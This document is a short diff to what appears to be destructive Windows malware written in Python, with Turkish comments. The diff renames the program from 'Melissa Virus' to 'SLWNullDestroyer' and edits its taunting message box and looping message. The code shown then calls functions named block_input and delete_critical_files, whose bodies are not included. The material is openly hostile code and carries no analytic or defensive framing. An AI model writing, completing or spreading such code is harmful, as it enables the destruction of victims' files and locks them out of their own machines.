@@ -15,11 +15,11 @@ def delete_critical_files():
 def infinite_loop():
     # Sonsuz döngü
     while True:
-        print("😀😂😈 Melissa was here!")
-        time.sleep(0.5)
+        print("😀😂😈 SLWNullDestroyer was here!")
+        time.sleep(1)
 
 # Büyük mesaj
-ctypes.windll.user32.MessageBoxW(0, "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY", "Melissa Virus", 0)
+ctypes.windll.user32.MessageBoxW(0, "SEE YOU LATER BABY 😈\nSYS: SLAWEALLY", "SLWNullDestroyer", 0)
 
 block_input()
 delete_critical_files()
